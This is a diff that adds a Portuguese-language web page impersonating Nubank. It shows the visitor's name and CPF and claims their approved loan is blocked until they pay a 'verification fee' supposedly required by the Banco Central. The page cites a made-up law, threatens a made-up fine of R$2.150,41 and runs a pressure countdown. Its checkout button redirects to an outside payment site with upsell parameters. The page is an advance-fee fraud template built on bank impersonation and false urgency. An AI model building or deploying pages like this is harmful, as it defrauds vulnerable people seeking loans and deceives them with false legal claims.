@@ -1,0 +1,407 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<script>
+  window.pixelId = "6811abfbce7f46f751dac6c8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+      <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-subids
+        data-utmify-ignore-iframe
+        async
+        defer
+      ></script>
+    <link rel="icon" href="images/favicon.png" type="./image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favicon.png">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+    <title>Zero Taxação</title>
+</head>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');
+* {
+  font-family: "Roboto", sans-serif;
+
+}
+p{font-weight: 300;}
+</style>
+
+<body>
+    <div id="content">
+        <style>
+            .navbar {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                background-color: #820AD1;
+                padding-bottom: 10px;
+                padding-left: 10px;
+            }
+        </style>
+<nav class="navbar" style="padding: 15px; background-color: #820AD1; display: flex; align-items: center; justify-content: center;">
+
+  <!-- Logo -->
+  <div class="logo-central" style="margin-right: 30px;">
+    <img src="https://ilegra.com/wp-content/uploads/2021/01/nubank-logo-branco.png" style="width: 120px;" alt="Logo Banco Central">
+  </div>
+
+  <!-- Linha vertical -->
+  <div style="width: 1px; height: 50px; background-color: white; margin: 0 30px;"></div>
+
+  <!-- Nome e CPF -->
+  <div style="color: white; display: flex; flex-direction: column;">
+    <span style="font-size: 14px;" id="nome">Nome da pessoa</span>
+    <span style="font-size: 18px; font-weight: bold;" id="cpf">000.000.000-00</span>
+  </div>
+
+</nav>
+
+        <style>
+            .container {
+                text-align: center;
+                margin-top: 20px;
+            }
+            .container h1 {
+                font-size: 1.5em;
+                color: #333;
+            }
+            .container span {
+                font-size: 1.2em;
+                color: #666;
+            }
+        </style>
+
+
+        <div class="progress-container">
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar1"></div>
+
+                    <div class="check-container" id="check1">
+                        <img src="images/success.png" alt="Animação" id="img1">
+                    </div>
+                </div>
+
+                <p id="text1">Analisando Dados</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar2"></div>
+
+                    <div class="check-container" id="check2">
+                        <img src="images/success.png" alt="Animação" id="img2">
+                    </div>
+                </div>
+
+                <p id="text2">Preparando transferência</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar3"></div>
+
+                    <div class="check-container" id="check3">
+                        <img src="images/success.png" alt="Animação" id="img3">
+                    </div>
+                </div>
+
+                <p id="text3">Pagamento Efetuado</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar4"></div>
+
+                    <div class="check-container" id="check4">
+                        <img src="images/success.png" alt="Animação" id="img4">
+                    </div>
+                </div>
+
+                <p id="text4">Concluido</p>
+            </div>
+        </div>
+
+        <section id="more-information" style="background: white;padding: 10px;border-radius: 20px 20px 20px 20px;">
+            <h1 style="color: #ff0000;font-size: 35px;">ATENÇÃO!</h1>
+
+            <h2>Confirmação necessária</h2>
+
+            <p style="font-size: 18px;">
+               Foi identificada uma <span style="color: #ff0000;">pendência obrigatória</span> durante a análise do seu empréstimo,<b></b> a Taxa de Verificação exigida pelo Banco Central (Lei 15.179/25).</b> Sem a quitação desta taxa, o valor não poderá ser liberado por segurança bancária.      </p>
+
+            <p style="font-size: 18px;padding:10px;background: white;border:1px solid silver;border-radius:4px;">
+                Este valor é totalmente reembolsável 
+junto com seu empréstimo, em até 10 minutos 
+após confirmação.
+            </p>
+
+            <p>Clique no botão abaixo para calcular e regularizar a taxa.</p>
+
+
+            <button id="show-offer" style="background: #820AD1;" disabled="">CALCULAR TAXA</button>
+
+
+   <footer>
+  <div style="justify-content: center;display: flex;padding: 20px;">
+    <img src="footer.png" alt="" style="max-width: 200px;">
+  </div>
+</footer>            
+        </section>
+    </div>
+<style>
+  div#content {
+  width: 100%;
+  max-width: 600px;
+  min-height: 100vh;
+  background-color: transparent;
+}
+  .progress-container {
+  width: calc(100% - 30px);
+  max-width: calc(100% - 20px);
+  height: 101px !important;
+  padding: 0 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-bottom: 30px;
+}
+</style>
+    <div id="offer-modal" class="modal">
+        <div class="modal-content">
+
+            <div id="step1">
+                <h1>Verificando pendência</h1>
+
+                <div id="trace" class="progress-bar2"></div>
+
+                <p>Por favor, aguarde enquanto processamos...</p>
+            </div>
+
+            <div id="step2">
+
+                <span id="reason" class="bold" style="
+    font-size: 22px;color:#ff0000;margin-bottom: 15px;
+">PENDÊNCIA IDENTIFICADA!</span><br>
+<style>
+  .progress-bar2 {
+  width: 0;
+  height: 4px;
+  border-radius: 4px;
+  background-color: #db0101 !important;
+  transition: width 0.8s ease-out;
+}
+</style>
+                <p><span class="bold">Seu empréstimo está PRONTO PARA DEPÓSITO,</span> mas foi bloqueado por pendência obrigatória: Taxa de Verificação Bancária, exigência do Banco Central (Lei 15.179/25). 
+                  
+                </p>
+
+                <div style="color:white;padding:20px;margin: 20px 5px 20px 5px; text-align: center;background-color: #1451B4;border-radius: 0px 0px 10px 10px;width: 90%;">
+
+                <h1>Confirmação obrigatória:</h1>
+
+                <h1 id="value" style="
+    font-size: 35px;
+    margin-top: 15px;
+">R$25,81</h1>
+                </div>
+
+                <p style="text-align: center;">
+                    O não pagamento desta taxa bloqueia o depósito imediato e ativa <b>multa bancária de R$ 2.150,41
+ conforme regras do sistema.</b>
+                </p>
+<br>
+                <p style="text-align: center;">
+                    Regularize agora mesmo! <b>Clique no botão abaixo</b> para pagar a Taxa de Verificação e quitar tudo.
+                </p>
+<style>
+@keyframes pulse {
+  0% {
+    transform: scale(1);
+    opacity: 1;
+  }
+  50% {
+    transform: scale(1.05);
+    opacity: 0.9;
+  }
+  100% {
+    transform: scale(1);
+    opacity: 1;
+  }
+}
+
+#btnSaque {
+color: white;
+  padding: 20px;
+  margin: 10px auto;
+  font-size: 15px;
+  border: 0;
+  text-align: center;
+  background-color: #1451B4;
+  border-radius: 10px;
+  animation: pulse 2s ease-in-out infinite;
+  width: 90%;
+}
+</style>
+
+<button
+  type="button"
+  id="btnSaque"
+  onclick="checkout()"
+  >
+  REGULARIZAR TAXA
+</button>
+
+
+               <p style="font-size: 13px;">Tempo restante para Regularizar - <span class="bold4" id="timer">04:52</span></p>
+
+<script>
+  // Tempo inicial em minutos e segundos
+  let minutes = 4;
+  let seconds = 52;
+
+  const timerElement = document.getElementById('timer');
+
+  function updateTimer() {
+    // Formata os minutos e segundos com dois dígitos
+    const min = String(minutes).padStart(2, '0');
+    const sec = String(seconds).padStart(2, '0');
+    timerElement.textContent = `${min}:${sec}`;
+
+    // Decrementa o tempo
+    if (minutes === 0 && seconds === 0) {
+      clearInterval(countdown);
+      timerElement.textContent = "00:00";
+      return;
+    }
+
+    if (seconds === 0) {
+      minutes--;
+      seconds = 59;
+    } else {
+      seconds--;
+    }
+  }
+
+  // Atualiza o timer a cada segundo
+  updateTimer(); // Atualiza imediatamente ao carregar
+  const countdown = setInterval(updateTimer, 1000);
+</script>
+
+            </div>
+        </div>
+    </div>
+
+<script>
+  // Carregar valor aprovado do localStorage
+        const valorAprovado =
+          localStorage.getItem("creditoAprovado") || "7.584,00";
+        document.getElementById("approvedAmount").textContent =
+          "R$ " + valorAprovado;
+</script><script>
+  window.addEventListener("DOMContentLoaded", function () {
+    const params = new URLSearchParams(window.location.search)
+    let nome = params.get("nome") || ""
+    let cpf = params.get("cpf") || ""
+
+    if (!nome) {
+      const nomeLs = localStorage.getItem("nomeUsuario") || ""
+      if (nomeLs) nome = nomeLs
+      else {
+        const dadosRaw = localStorage.getItem("dadosUsuario") || ""
+        if (dadosRaw) {
+          try {
+            const dados = JSON.parse(dadosRaw)
+            if (dados && dados.nome) nome = dados.nome
+          } catch (e) {}
+        }
+      }
+    }
+
+    if (!cpf) {
+      const cpfLs = localStorage.getItem("cpf") || ""
+      if (cpfLs) cpf = cpfLs
+      else {
+        const dadosRaw = localStorage.getItem("dadosUsuario") || ""
+        if (dadosRaw) {
+          try {
+            const dados = JSON.parse(dadosRaw)
+            if (dados && dados.cpf) cpf = dados.cpf
+          } catch (e) {}
+        }
+      }
+    }
+
+    function limparCpf(v) {
+      return String(v || "").replace(/\D/g, "").slice(0, 11)
+    }
+
+    function formatarCpf(v) {
+      const d = limparCpf(v)
+      if (d.length !== 11) return ""
+      return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
+    }
+
+    function normalizarNome(v) {
+      const s = String(v || "").trim()
+      if (!s) return ""
+      try {
+        return decodeURIComponent(s.replace(/\+/g, " "))
+      } catch (e) {
+        return s.replace(/\+/g, " ")
+      }
+    }
+
+    nome = normalizarNome(nome)
+    cpf = formatarCpf(cpf)
+
+    const nomeEl = document.getElementById("nome")
+    const cpfEl = document.getElementById("cpf")
+
+    if (nomeEl && nome) nomeEl.textContent = nome
+    if (cpfEl && cpf) cpfEl.textContent = cpf
+  })
+</script>
+
+
+
+<style>
+    .bold{color: black;}
+</style>
+    <script>
+  function checkout() {
+    const urlParams = new URLSearchParams(window.location.search);
+              
+            document.getElementById("btnSaque").disabled = true;  
+    // Remove o value antigo da URL
+    urlParams.delete("value");
+
+    // Monta a nova URL com o novo value
+    urlParams.set("value", "25.81");
+
+    urlParams.set("upsell", "1");
+    urlParams.set("produto_id", "332");
+    // Redireciona
+    const destino = "https://pay.areadepagamentosonline.com/693b555d078bc7273992dbb9?" + urlParams.toString();
+    window.location.href = destino;
+  };
+</script>
+    <script src="js/scripts.js"></script>
+
+
+
+</body></html>
